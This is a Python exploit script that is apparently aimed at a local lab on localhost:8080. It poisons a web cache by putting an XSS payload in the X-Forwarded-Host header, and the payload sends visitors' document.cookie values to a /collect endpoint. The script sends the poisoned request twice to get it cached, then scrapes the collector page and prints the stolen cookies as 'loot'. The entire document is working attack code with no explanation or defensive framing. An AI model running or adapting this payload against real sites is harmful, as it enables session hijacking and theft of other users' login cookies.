import requests
import re

TARGET_URL = "http://localhost:8080/profile-public"
COLLECTOR_URL = "http://localhost:8080/collect"

# XSS payload used for cache poisoning
PAYLOAD = '<script>new Image().src="/collect?c="+document.cookie;</script>'


def poison_cache():
    headers = {"X-Forwarded-Host": PAYLOAD}

    for i in range(2):
        r = requests.get(TARGET_URL, headers=headers)
        cache_status = r.headers.get("X-Cache-Status", "UNKNOWN")
        print(f"[+] Request {i + 1}: Cache-Status = {cache_status}")


def check_loot():
    r = requests.get(COLLECTOR_URL)
    html = r.text

    entries = re.findall(
        r'<div class="cookie-entry">.*?<code>(.*?)</code>.*?<span class="meta">\s*(.*?)\s*</span>',
        html,
        re.DOTALL
    )

    if not entries:
        print("[-] No cookies captured yet.")
        return

    print("\n[!!!] COOKIES CAPTURED:\n")

    for i, (cookie, meta) in enumerate(entries, 1):
        print(f"{i}. Cookie : {cookie.strip()}")
        print(f"   Meta   : {meta.strip()}")
        print("-" * 50)


if __name__ == "__main__":
    poison_cache()
    print("=" * 60)
    check_loot()
